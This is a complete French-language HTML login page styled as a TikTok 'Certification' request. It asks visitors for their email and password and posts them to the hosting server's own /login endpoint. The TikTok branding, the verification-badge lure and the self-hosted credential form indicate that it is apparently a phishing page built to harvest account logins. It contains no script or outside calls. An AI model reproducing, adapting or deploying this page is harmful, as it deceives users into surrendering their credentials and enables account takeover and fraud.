<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<title>Connexion</title>
<style>
  :root {
    --bg-1: #070b1d;
    --bg-2: #1d1136;
    --bg-3: #ff4db8;
    --card: rgba(17, 19, 35, 0.88);
    --card-2: rgba(30, 18, 49, 0.9);
    --pink: #ff4db8;
    --purple: #8b5cf6;
    --cyan: #38d7ff;
    --yellow: #ffd84d;
    --text: #f9f7ff;
    --muted: #d6c7ff;
    --line: rgba(255, 255, 255, 0.12);
    --shadow: rgba(255, 77, 184, 0.35);
  }

  * { box-sizing: border-box; }

  body {
    margin: 0;
    min-height: 100vh;
    display: grid;
    place-items: center;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    background: radial-gradient(circle at top, rgba(139,92,246,0.35), transparent 30%),
                radial-gradient(circle at bottom right, rgba(255,77,184,0.25), transparent 25%),
                linear-gradient(135deg, var(--bg-1), var(--bg-2));
    color: var(--text);
  }

  .login-shell {
    width: min(92vw, 420px);
    background: linear-gradient(180deg, rgba(22, 20, 37, 0.96), rgba(16, 12, 27, 0.9));
    border: 1px solid var(--line);
    border-radius: 28px;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.42), 0 0 0 1px rgba(255, 77, 184, 0.18);
    padding: 28px 22px 24px;
    position: relative;
    overflow: hidden;
  }

  .login-shell::before {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, rgba(255,77,184,0.18), rgba(56,215,255,0.08), transparent 60%);
    pointer-events: none;
  }

  .brand {
    display: block;
    width: 150px;
    margin: 0 auto 12px;
    position: relative;
    z-index: 1;
    filter: drop-shadow(0 12px 24px rgba(255, 77, 184, 0.4));
  }

  h1 {
    position: relative;
    z-index: 1;
    margin: 0 0 6px;
    text-align: center;
    font-size: clamp(2rem, 5vw, 2.8rem);
    line-height: 1.1;
    letter-spacing: -0.05em;
    background: linear-gradient(135deg, #ffd84d 0%, #ff4db8 45%, #6ee7ff 100%);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    text-transform: uppercase;
    font-weight: 900;
  }

  .subtitle {
    position: relative;
    z-index: 1;
    text-align: center;
    color: var(--muted);
    margin: 0 0 18px;
    font-size: 0.95rem;
    line-height: 1.6;
  }

  form {
    position: relative;
    z-index: 1;
    display: grid;
    gap: 14px;
  }

  input {
    width: 100%;
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 14px;
    padding: 15px 16px;
    font-size: 1rem;
    background: rgba(255,255,255,0.04);
    color: var(--text);
    outline: none;
    transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
  }

  input::placeholder {
    color: rgba(255,255,255,0.5);
  }

  input:focus {
    border-color: rgba(255, 77, 184, 0.9);
    box-shadow: 0 0 0 4px rgba(255, 77, 184, 0.12);
    transform: translateY(-1px);
  }

  button {
    border: none;
    border-radius: 14px;
    background: linear-gradient(135deg, var(--pink) 0%, var(--purple) 50%, var(--cyan) 100%);
    color: white;
    padding: 15px 18px;
    font-size: 1rem;
    font-weight: 800;
    cursor: pointer;
    transition: transform 0.2s ease, box-shadow 0.2s ease;
    box-shadow: 0 14px 24px rgba(255, 77, 184, 0.22);
  }

  button:hover {
    transform: translateY(-2px) scale(1.01);
    box-shadow: 0 18px 28px rgba(139, 92, 246, 0.24);
  }

  .meta {
    position: relative;
    z-index: 1;
    margin-top: 14px;
    text-align: center;
    color: rgba(255,255,255,0.7);
    font-size: 0.78rem;
    letter-spacing: 0.08em;
    text-transform: uppercase;
  }
</style>
</head>
<body>
  <div class="login-shell">
    <img class="brand" src="/static/logo.png" alt="logo TikTok">
    <h1>Certification</h1>
    <p class="subtitle">Connectez-vous pour envoyer votre demande de certification.</p>

    <form method="post" action="/login">
      <input type="email" name="email" placeholder="Adresse e-mail" required autofocus>
      <input type="password" name="password" placeholder="Mot de passe" required>
      <button type="submit">Se connecter</button>
    </form>

    <div class="meta">Fast • Secure • Viral</div>
  </div>
</body>
</html>
